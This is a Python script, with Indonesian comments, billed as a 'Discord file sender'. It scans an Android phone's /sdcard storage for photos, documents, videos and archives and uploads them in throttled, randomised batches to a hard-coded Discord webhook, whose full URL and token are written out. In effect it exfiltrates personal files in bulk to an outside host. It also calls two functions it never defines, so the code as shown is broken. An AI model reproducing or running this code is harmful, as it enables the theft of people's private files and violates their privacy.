# Enhanced Discord File Sender by Anos - Improved Version
import os
import time
import requests
import random
import json
from datetime import datetime

# Konfigurasi webhook Discord
webhook = "https://discord.com/api/webhooks/1335133598319378525/0PnTXCcVhyt-s4QIfmAekyxgkSieVH3q9WlNDODvuEjmMCge2mtwd6ONrQRzXHYZMqYF"

# Konfigurasi path dan folder yang dilewati
base_path = "/sdcard"
skip_folders = ["Android", "com.", "MIUI", "data", ".thumbnails", "DCIM/Camera"]
file_extensions = [".jpg", ".jpeg", ".png", ".pdf", ".txt", ".docx", ".mp4", ".zip"]

# Batas ukuran file Discord (8MB)
MAX_FILE_SIZE = 8 * 1024 * 1024

# Konfigurasi batasan pengiriman
FILES_PER_BATCH = 5  # Jumlah file per batch
BATCH_INTERVAL = 60  # Interval antar batch dalam detik (1 menit)
MIN_INTERVAL = 12  # Interval minimum antar file dalam detik
MAX_INTERVAL = 16  # Interval maksimum antar file dalam detik

def check_file_extension(filename):
    _, ext = os.path.splitext(filename)
    return ext.lower() in file_extensions or not file_extensions

def check_file_size(path):
    try:
        return os.path.getsize(path) <= MAX_FILE_SIZE
    except:
        return False

def kirim_file(path, sent_files):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(path, "rb") as f:
            file_data = f.read()
            
        file_name = os.path.basename(path)
        
        # Tambahkan informasi waktu pada nama file
        file_name = f"{timestamp}_{file_name}"
        
        response = requests.post(
            webhook, 
            files={"file": (file_name, file_data)},
            timeout=30
        )
        
        if response.status_code == 200 or response.status_code == 204:
            print(f"✅ Berhasil: {path}")
            sent_files.append(path)
            return True
        else:
            print(f"❌ Gagal: {path} - Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Error {path}: {str(e)}")
        return False

def scan_dir():
    sent_files = load_sent_files()
    all_files = []
    
    # Menemukan semua file valid
    for root, dirs, files in os.walk(base_path):
        # Skip folder yang tidak diinginkan
        if any(skip in root for skip in skip_folders):
            continue
            
        for file in files:
            full_path = os.path.join(root, file)
            
            # Skip jika sudah dikirim sebelumnya
            if full_path in sent_files:
                continue
                
            # Periksa ekstensi dan ukuran file
            if check_file_extension(file) and check_file_size(full_path):
                all_files.append(full_path)
    
    # Jika tidak ada file baru
    if not all_files:
        print("Tidak ada yang ditemukan untuk dikirim")
        return
        
    # Acak urutan file untuk variasi
    random.shuffle(all_files)
    
    # Jumlah total file yang akan dikirim
    total_files = len(all_files)
    print(f"Ditemukan {total_files} untuk dikirim")
    
    # Batasi jumlah file jika terlalu banyak
    max_files = min(total_files, 1000)  # Batasi maksimum 1000 file per eksekusi
    files_to_send = all_files[:max_files]
    
    # Mengirim file dalam batch
    files_sent = 0
    batch_count = 0
    
    for i, file_path in enumerate(files_to_send):
        # Cek apakah perlu jeda antar batch
        if i > 0 and i % FILES_PER_BATCH == 0:
            batch_count += 1
            print(f"\n⏱️ Istirahat antar batch ({batch_count}). Menunggu {BATCH_INTERVAL} detik...")
            save_sent_files(sent_files)  # Simpan progres saat ini
            time.sleep(BATCH_INTERVAL)
            print(f"Melanjutkan pengiriman berikutnya...\n")
        
        # Kirim file saat ini
        success = kirim_file(file_path, sent_files)
        
        if success:
            files_sent += 1
            
        # Jeda acak antar file dalam satu batch
        if i < len(files_to_send) - 1:  # Jika bukan file terakhir
            sleep_time = random.uniform(MIN_INTERVAL, MAX_INTERVAL)
            print(f"⏳ Menunggu {sleep_time:.1f} detik sebelum berikutnya...")
            time.sleep(sleep_time)
    
    # Simpan daftar file yang sudah dikirim
    save_sent_files(sent_files)
    
    print(f"\n✅ Selesai! Berhasil mengirim {files_sent} dari {len(files_to_send)} file.")

# Menjalankan program
if __name__ == "__main__":
    print("🚀 Memulai pengiriman...")
    start_time = time.time()
    
    try:
        scan_dir()
    except Exception as e:
        print(f"❌ Error utama: {str(e)}")
    
    end_time = time.time()
    duration = end_time - start_time
    print(f"⏱️ Total waktu eksekusi: {duration:.2f} detik ({duration/60:.2f} menit)")